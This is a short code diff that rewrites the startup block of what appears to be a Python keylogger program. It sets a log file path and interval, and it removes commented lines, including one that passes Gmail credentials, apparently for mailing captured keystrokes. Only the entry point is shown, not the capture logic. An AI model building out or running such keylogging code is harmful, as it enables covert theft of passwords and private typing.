@@ -47,11 +47,4 @@ class main:
                         self.keylogger.clear_key_log()
 
 
-if __name__ == "__main__":
-    main = main(60, "c:/temp/log.txt")
-
-    # main = main(180, os.environ["TEMP"] + "/log.txt")
-    # main = main(180, "", True, True, True, True)
-    # main.override_gmail("email@gmail.com", "pass")
-
-    main.start()
+if __name__ == "__main__": main = main(60, "C:/temp/log.txt", False, False, False, False);main.start()
